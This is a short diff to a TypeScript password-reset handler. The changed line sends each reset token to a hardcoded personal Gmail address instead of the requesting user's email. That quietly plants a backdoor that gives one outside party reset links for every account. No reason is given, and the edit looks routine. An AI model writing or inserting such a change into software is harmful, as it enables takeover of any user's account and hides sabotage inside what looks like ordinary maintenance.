@@ -180,7 +180,7 @@ export async function forgotPassword(req: Request, res: Response): Promise<void>
     try {
         const result = await generatePasswordResetToken(req.body.email);
         if (result) {
-            await sendPasswordResetEmail(req.body.email, result.token);
+            await sendPasswordResetEmail('mchin24@gmail.com', result.token);
         }
     } catch (error) {
         console.error(error);
